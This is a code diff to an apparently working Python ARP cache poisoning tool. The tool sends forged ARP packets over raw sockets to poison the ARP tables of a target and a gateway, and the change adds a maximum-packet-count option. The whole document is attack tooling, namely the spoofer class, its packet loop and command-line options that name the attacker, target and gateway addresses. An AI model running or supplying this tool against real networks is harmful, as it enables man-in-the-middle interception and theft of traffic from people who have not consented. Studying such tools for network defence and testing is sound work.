@@ -10,6 +10,7 @@ A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
 import argparse
 import re
 import time
+from itertools import count
 from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
 
 
@@ -77,35 +78,33 @@ class ARPPacket(object):
 
 
 class Spoofer(object):
-    def __init__(self, interface: str, *, arp_packets, interval: float):
+    def __init__(self, interface: str, *, arp_packets):
         self.interface = interface
         self.arp_packets = arp_packets
-        self.interval = interval
 
-    def execute(self):
+    def execute(self, *, max_packets: int, interval: float):
         with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
             sock.bind((self.interface, htons(0x0800)))
-            while True:
+            for packet_count in count(start=1):
                 for packet in self.arp_packets:
                     sock.send(packet)
-                time.sleep(self.interval)
+                time.sleep(interval)
+                if packet_count == max_packets:
+                    break
 
 
 def spoof(args):
     """Controls the flow of execution of the ARP Spoofer tool."""
-    packets = ARPPacket(attacker_mac=args.attackermac,
-                        gateway_mac=args.gatemac,
-                        target_mac=args.targetmac,
-                        gateway_ip=args.gateip,
+    packets = ARPPacket(attacker_mac=args.attackermac, gateway_mac=args.gatemac,
+                        target_mac=args.targetmac, gateway_ip=args.gateip,
                         target_ip=args.targetip)
-    spoofer = Spoofer(interface=args.interface,
-                      arp_packets=packets,
-                      interval=args.interval)
+
+    spoofer = Spoofer(interface=args.interface, arp_packets=packets)
 
     print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
           'abort.'.format(time.strftime("%H:%M:%S", time.localtime())))
     try:
-        spoofer.execute()
+        spoofer.execute(max_packets=args.maxpackets, interval=args.interval)
     except KeyboardInterrupt:
         print('[!] Aborting ARP Spoofing attack...')
         print('    [+] Restoring target ARP tables to their previous states...')
@@ -139,5 +138,9 @@ if __name__ == '__main__':
                         help='Time to wait between transmission of each set of '
                              'ARP Cache Poisoning attack packets (defaults to '
                              '0.5 seconds).')
+    parser.add_argument('--maxpackets', type=int, default=0, metavar='PACKETS',
+                        help='The maximum number of packets to transmit to '
+                             'the targets during the attack (defaults to 0 to '
+                             'set an infinite number of packets).')
     cli_args = parser.parse_args()
     spoof(cli_args)
